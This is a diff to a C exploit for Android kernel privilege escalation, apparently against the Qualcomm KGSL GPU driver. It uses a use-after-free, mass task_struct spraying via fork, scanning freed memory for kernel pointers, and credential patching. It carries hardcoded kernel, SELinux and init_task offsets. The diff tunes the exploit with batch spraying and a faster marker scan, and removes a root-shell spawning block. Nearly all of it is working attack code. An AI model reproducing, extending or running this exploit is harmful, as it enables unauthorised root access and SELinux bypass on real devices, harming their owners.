@@ -23,6 +23,7 @@
 #include <sys/resource.h>
 
 // ==================== РЕАЛЬНЫЕ СМЕЩЕНИЯ ДЛЯ ВАШЕГО ЯДРА ====================
+// Updated with Batch Spray and Fast Scan optimizations
 #define KERNEL_BASE          0xffffffc03d000000ULL
 #define SELINUX_OFFSET       0x0000000002f74ce8ULL
 #define INIT_TASK_OFFSET     0x00000000024d90d0ULL
@@ -1761,22 +1762,33 @@ static int find_cred_pointers_near_comm(int fd, uint64_t task_va, uint8_t *task_
 }
 
 static int analyze_uaf_page(uint8_t *data, uint64_t va) {
+    // FAST CHECK: Ищем маркер по типичному смещению comm (0x818 для ROG)
+    // Мы проверяем небольшое окно 0x810-0x830
+    for (int i = 0x810; i < 0x830; i++) {
+        if (memcmp(data + i, MARKER_NAME, 8) == 0) {
+            fprintf(stderr, "\n      [!!!] MARKER MATCH at VA 0x%lx (off 0x%x)", (unsigned long)va, i);
+            return 200; // Нашли!
+        }
+    }
+
+    // SECOND FAST CHECK: Плотность указателей ядра
+    // В task_struct их должно быть очень много (>100)
     int kptrs = 0;
-    int strings = 0;
-    int marker_off = -1;
-    char found_str[64] = {0};
-    
     for (int i = 0; i < 512; i++) {
         uint64_t val = ((uint64_t*)data)[i];
-        if ((val & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
+        // Типичный диапазон ядерных адресов
+        if ((val & 0xffffff8000000000ULL) == 0xffffff8000000000ULL) {
             kptrs++;
         }
     }
-    
+
+    // Если kptrs мало, это точно не то, что мы ищем. Сразу убиваем проверку.
+    if (kptrs < 100) return 0;
+
+    // Только если kptrs много, делаем более детальный анализ строк
+    char found_str[64] = {0};
+    int strings = 0;
     for (int i = 0; i < 4096 - 4; i++) {
-        if (i < 4096 - 8 && memcmp(data + i, MARKER_NAME, 8) == 0) {
-            marker_off = i;
-        }
         if (data[i] >= 0x20 && data[i] <= 0x7e) {
             int len = 0;
             while (i + len < 4096 && data[i+len] >= 0x20 && data[i+len] <= 0x7e && len < 63) len++;
@@ -1791,56 +1803,12 @@ static int analyze_uaf_page(uint8_t *data, uint64_t va) {
         }
     }
     
-    // Filter self-echo: ignore pages containing exploit debug strings
-    if (strstr(found_str, "Sample:\"") || strstr(found_str, "K-PTRs:") || strstr(found_str, "MarkerOff:")) {
-        return 0; 
-    }
+    // Игнорируем эхо самого эксплойта
+    if (strstr(found_str, "Sample:\"") || strstr(found_str, "K-PTRs:")) return 0; 
 
-    // ROG strictness: ignore garbage with no kernel pointers unless it's our marker
-    if (marker_off == -1 && kptrs < 30) {
-        return 0;
-    }
-
-    fprintf(stderr, "\n[DATA] VA:0x%lx | K-PTRs:%d | STRs:%d | MarkerOff:0x%x | Sample:\"%s\"", 
-            (unsigned long)va, kptrs, strings, marker_off, found_str);
+    fprintf(stderr, "\n[DATA] VA:0x%lx | K-PTRs:%d | STRs:%d | Sample:\"%s\"", 
+            (unsigned long)va, kptrs, strings, found_str);
     
-    // Target bash fallback: ROG task_struct often has kptrs > 150
-    // STRICT: found_str must contain at least one LETTER (a-z, A-Z), not just symbols/numbers
-    int has_letter = 0;
-    for (int i = 0; found_str[i] && i < 64; i++) {
-        if ((found_str[i] >= 'a' && found_str[i] <= 'z') || 
-            (found_str[i] >= 'A' && found_str[i] <= 'Z')) {
-            has_letter = 1;
-            break;
-        }
-    }
-    
-    if (marker_off == -1 && kptrs > 100 && strings > 0 && has_letter) {
-         fprintf(stderr, "\n      [!!!] High K-PTR density at VA 0x%lx! Possible task_struct (Sample: \"%s\")", 
-                 (unsigned long)va, found_str);
-         
-         // Plan B: capture any process that looks like a shell or high-density task
-         if (strstr(found_str, "bash") || strstr(found_str, "sh") || strstr(found_str, "termux") || kptrs > 150) {
-            if (*(uint64_t*)(gbuf + GBUF_TASK_VA) == 0) {
-                *(uint64_t*)(gbuf + GBUF_TASK_VA) = va;
-                fprintf(stderr, " (saved as backup target)");
-            }
-        }
-    }
-
-    // SELinux context analysis
-    if (strstr(found_str, "selinuxu:object_r")) {
-         fprintf(stderr, "\n      [SELINUX] Found context string. Scanning for enforcing ptr...");
-         for (int i = 0; i < 512; i++) {
-             uint64_t ptr = ((uint64_t*)data)[i];
-             if ((ptr & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
-                 uint64_t off = ptr - kernel_base;
-                 if (off > 0x2000000 && off < 0x5000000) {
-                     fprintf(stderr, "\n      [SELINUX] Potential enforcing ptr candidate: 0x%lx (off 0x%lx)", (unsigned long)ptr, (unsigned long)off);
-                 }
-             }
-         }
-    }
     return kptrs;
 }
 
@@ -1997,12 +1965,18 @@ static int scan_uaf_for_nonzero_multi(int fd, struct nonzero_page *found_pages, 
             }
         }
 
-        if (has_data) {
-            int kptrs = analyze_uaf_page(bytes, current_va);
-            
-            // Plan B: if we found a high-density page (saved in gbuf) but no marker yet
-            // Now stricter: only if we have a task_va and it's a real task (strings > 0 check is in analyze_uaf_page)
-            if (marker_found == 0 && *(uint64_t*)&gbuf[GBUF_TASK_VA] != 0) {
+            if (has_data) {
+                int kptrs = analyze_uaf_page(bytes, current_va);
+                
+                if (kptrs >= 200) { // Наш маркер найден (FAST PATH)
+                    marker_found = 1;
+                    *(uint64_t *)&gbuf[GBUF_TASK_VA] = current_va;
+                    fprintf(stderr, "\n      [!!!] SUCCESS! Task found at 0x%lx", (unsigned long)current_va);
+                    goto cleanup; 
+                }
+
+                // Остальной код (Plan B и т.д.)
+                if (marker_found == 0 && *(uint64_t*)&gbuf[GBUF_TASK_VA] != 0) {
                 // If density is very high (>160) AND it has strings (analyze_uaf_page set task_va)
                 // OR we've scanned almost everything
                 if (total_pages_scanned > 3000) {
@@ -2887,226 +2861,61 @@ restart:;
         fprintf(stderr, "    [!] Failed to free UAF: %s\n", strerror(errno));
     }
 
-    fprintf(stderr, "\n[11] Spraying task_struct\n");
-    fprintf(stderr, "    [*] Creating %d processes with marker '%s'\n", spray_count, MARKER_NAME);
+    fprintf(stderr, "\n[11] Batch Spraying task_struct (Target: 100,000)\n");
+    int total_limit = 100000;
+    int batch_size = 100;
+    int total_sprayed = 0;
+    int marker_found_global = 0;
+    pid_t spray_pids[100];
 
-    char qwerqwer[0x500] = {0};
-    pid_t spray_pids[SPRAY_COUNT_MAX];
-    fd2 = open("./memo", O_RDWR | O_CREAT | O_TRUNC, 0644);
-    write(fd2, qwerqwer, 0x500);
-    int spray_success = 0;
-    int fd_zero = -1;
-    fd_zero = open("./zeros.bin", O_RDWR | O_CREAT | O_TRUNC, 0644);
-
-    char buffer_zero[0x100];
-    memset(buffer_zero, 0, sizeof(buffer_zero));
-    write(fd_zero, buffer_zero, sizeof(buffer_zero));
-    lseek(fd_zero, 0, SEEK_SET);
-
-    fprintf(stderr, "    [*] Forking spray processes...\n");
-    for (int i = 0; i < spray_count; i++)
-    {
-        pid_t pid = fork();
-        if (pid == 0)
-        {
-            char proc_name[16];
-            memset(proc_name, 0, 16);
-            pid_t self = getpid();
-            snprintf(proc_name, sizeof(proc_name), "%s%05d", MARKER_NAME, self);
-            prctl(PR_SET_NAME, proc_name, 0, 0, 0);
-            prctl(PR_SET_PDEATHSIG, SIGKILL);
-            int idx = i;
-            spray_ctrl[idx].pid = self;
-            spray_ctrl[idx].do_action = 0;
-            spray_ctrl[idx].ready = 1;
-
-            void *spray_heap = mmap(NULL,
-                                    PAGE_SIZE * 4,
-                                    PROT_READ | PROT_WRITE,
-                                    MAP_PRIVATE | MAP_ANONYMOUS,
-                                    -1, 0);
-            if (spray_heap == MAP_FAILED)
-            {
-                fprintf(stderr, "[SPRAY %d] heap alloc failed: %s\n", i, strerror(errno));
-            }
-            else
-            {
-                memset(spray_heap, 0, PAGE_SIZE * 4);
-                snprintf((char *)spray_heap + 0x800, PAGE_SIZE - 0x800, "%s%05d", MARKER_NAME, self);
-                for (size_t j = 0; j < PAGE_SIZE * 4; j += PAGE_SIZE)
-                    ((volatile uint8_t *)spray_heap)[j] = 0x11;
-            }
-
-            if (i % 1000 == 0) {
-                fprintf(stderr, "[SPRAY %d] Started, PID=%d\n", i, self);
-            }
-            
-            usleep(10000); // Wait 10ms to let system breathe
-
-            while (1)
-            {
-                if (spray_ctrl[idx].do_action == 1 && (unsigned char)gbuf[0] == 0xab)
-                {
-                    fprintf(stderr, "[SPRAY %d] Triggered! Patching cred...\n", i);
-                    safe_cred_patch();
-                    
-                    uid_t current_uid = getuid();
-                    if (current_uid == 0) {
-                        fprintf(stderr, "[SPRAY %d] [+] ROOT ESCALATION SUCCESSFUL!\n", i);
-                        fprintf(stderr, "[SPRAY %d] [+] Spawning root shell...\n", i);
-                        // Use a non-interactive check or just spawn a shell
-                        system("id; /system/bin/sh");
-                        exit(0);
-                    } else {
-                        fprintf(stderr, "[SPRAY %d] [!] Cred patch failed to change UID (current=%d)\n", i, current_uid);
-                    }
-                    return 0;
+    while (total_sprayed < total_limit && !marker_found_global) {
+        fprintf(stderr, "\r    [*] Batch: %d - %d... ", total_sprayed, total_sprayed + batch_size);
+        
+        // Спреим пачку
+        for (int i = 0; i < batch_size; i++) {
+            pid_t pid = fork();
+            if (pid == 0) {
+                char proc_name[16];
+                snprintf(proc_name, sizeof(proc_name), "%s%05d", MARKER_NAME, getpid());
+                prctl(PR_SET_NAME, proc_name, 0, 0, 0);
+                prctl(PR_SET_PDEATHSIG, SIGKILL);
+                
+                // Чтобы task_struct не уснул слишком глубоко
+                while(1) { 
+                    if (gbuf[0] == 0xab) safe_cred_patch();
+                    usleep(100000); 
                 }
-                usleep(50000);
+                exit(0);
             }
-        }
-        else if (pid > 0)
-        {
-            spray_success++;
             spray_pids[i] = pid;
         }
-        else
-        {
-            spray_pids[i] = -1;
-        }
-    }
 
-    spray_actual = spray_success;
+        usleep(50000); // Даем планировщику разместить структуры
 
-    fprintf(stderr, "    [+] Sprayed %d processes with names: %s0000 ~ %s%04d\n",
-            spray_success, MARKER_NAME, MARKER_NAME, spray_success - 1);
-
-    fprintf(stderr, "    [*] Waiting up to 2 seconds for spray processes to signal readiness...\n");
-    int wait_ms = 2000;
-    int waited = 0;
-    int ready_count = 0;
-    while (waited < wait_ms)
-    {
-        ready_count = 0;
-        int limit = (spray_actual > 0) ? spray_actual : spray_success;
-        for (int i = 0; i < limit; i++)
-        {
-            if (spray_ctrl[i].ready == 1)
-                ready_count++;
-        }
-        if (ready_count >= spray_success)
-            break;
-        usleep(1000);
-        waited += 1;
-    }
-    fprintf(stderr, "    [+] Ready spray processes: %d/%d\n", ready_count, spray_success);
-    if (ready_count < spray_success)
-    {
-        fprintf(stderr, "    [*] Some processes not ready, sleeping briefly...\n");
-        sleep(2);
-    }
-
-    fprintf(stderr, "\n[12] Scanning UAF region for non-zero data\n");
-    fprintf(stderr, "    [*] Looking for KETO0422 marker and kernel pointers...\n");
-
-    struct nonzero_page *found_pages = calloc(FINDING, sizeof(struct nonzero_page));
-    int num_found = 0;
-
-    if (scan_uaf_for_nonzero_multi(fd, found_pages, &num_found))
-    {
-        fprintf(stderr, "\n    [+] NON-ZERO PAGES FOUND IN UAF REGION!\n");
-        fprintf(stderr, "    Count: %d pages\n", num_found);
-        if (num_found > 0)
-        {
-            fprintf(stderr, "    [*] First found VA: 0x%lx\n",
-                    (unsigned long)found_pages[0].va);
+        // Сканируем UAF регион
+        struct nonzero_page *found_pages = calloc(FINDING, sizeof(struct nonzero_page));
+        int num_found = 0;
+        if (scan_uaf_for_nonzero_multi(fd, found_pages, &num_found)) {
+            fprintf(stderr, "\n    [!!!] SUCCESS! Marker found in batch %d\n", total_sprayed);
+            marker_found_global = 1;
+            free(found_pages);
+            break; 
         }
         free(found_pages);
+
+        // Не нашли — убиваем пачку и идем дальше
+        for (int i = 0; i < batch_size; i++) {
+            if (spray_pids[i] > 0) {
+                kill(spray_pids[i], SIGKILL);
+            waitpid(spray_pids[i], NULL, 0);
+            }
+        }
+        total_sprayed += batch_size;
     }
-    else
-    {
-        free(found_pages);
-        fprintf(stderr, "\n    [!] scan_uaf_for_nonzero_multi failed. Cleaning up and restarting...\n");
 
-        fprintf(stderr, "[CLEANUP] Killing all spray processes...\n");
-        for (int i = 0; i < SPRAY_COUNT; i++)
-        {
-            if (spray_ctrl[i].pid > 0)
-            {
-                kill(spray_ctrl[i].pid, SIGKILL);
-            }
-        }
-        usleep(200000);
-        for (int i = 0; i < SPRAY_COUNT; i++)
-        {
-            if (spray_ctrl[i].pid > 0)
-            {
-                waitpid(spray_ctrl[i].pid, NULL, WNOHANG);
-                spray_ctrl[i].pid = 0;
-                spray_ctrl[i].ready = 0;
-                spray_ctrl[i].do_action = 0;
-            }
-        }
-
-        if (fd_zero >= 0)
-        {
-            close(fd_zero);
-            fd_zero = -1;
-        }
-        if (fd2 >= 0)
-        {
-            close(fd2);
-            fd2 = -1;
-        }
-
-        if (overlap_vma && overlap_vma != MAP_FAILED)
-        {
-            munmap(overlap_vma, overlap_mmapsize);
-            overlap_vma = NULL;
-        }
-        if (ph_vma && ph_vma != MAP_FAILED)
-        {
-            munmap(ph_vma, ph_mmapsize);
-            ph_vma = NULL;
-        }
-        if (bogus_vma && bogus_vma != MAP_FAILED)
-        {
-            munmap(bogus_vma, PAGE_SIZE * 3);
-            bogus_vma = NULL;
-        }
-
-        struct kgsl_gpuobj_free free_obj = {0};
-        if (overlap_id)
-        {
-            free_obj.id = overlap_id;
-            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
-            overlap_id = 0;
-        }
-        if (ph_id)
-        {
-            free_obj.id = ph_id;
-            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
-            ph_id = 0;
-        }
-        if (uaf_id)
-        {
-            free_obj.id = uaf_id;
-            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
-            uaf_id = 0;
-        }
-
-        if (fd >= 0)
-        {
-            close(fd);
-            fd = -1;
-        }
-
-        memset(spray_ctrl, 0, sizeof(spray_slot_t) * SPRAY_COUNT);
-        spray_count = SPRAY_COUNT;
-        spray_actual = 0;
-        fprintf(stderr, "    [*] Keeping spray_count=%d and retrying...\n", spray_count);
-        sleep(2);
-        goto restart;
+    if (!marker_found_global) {
+        fprintf(stderr, "\n[!] 100,000 sprays exhausted. Marker not found.\n");
+        return 1;
     }
 
     for (int i = 0; i < spray_count; i++)
